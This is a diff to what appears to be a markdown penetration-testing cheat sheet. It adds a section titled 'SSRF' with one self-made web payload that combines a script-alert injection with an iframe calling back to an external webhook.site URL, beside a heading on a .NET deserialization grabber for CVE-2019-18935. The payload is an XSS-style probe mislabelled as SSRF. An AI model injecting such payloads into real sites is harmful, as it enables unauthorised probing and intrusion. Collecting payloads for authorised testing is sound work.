@@ -39,6 +39,19 @@
 
 <br>
 
+# SSRF
+- Personally created SSRF payloads <br>
+
+```html
+;//<!----><SCRIPT>alert(1);</SCRIPT><iframe src="https://webhook.site/8e16a463-4b8e-4cdf-ba16-e44cf0f320df"></iframe>
+```
+
+<br>
+
+<hr>
+
+<br>
+
 # cURL .NET Serialized object grabber
 - [cURL](https://linux.die.net/man/1/curl) is a tool to transfer data from or to a server.
 - .NET Deserialization ([CVE-2019-18935](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-18935))
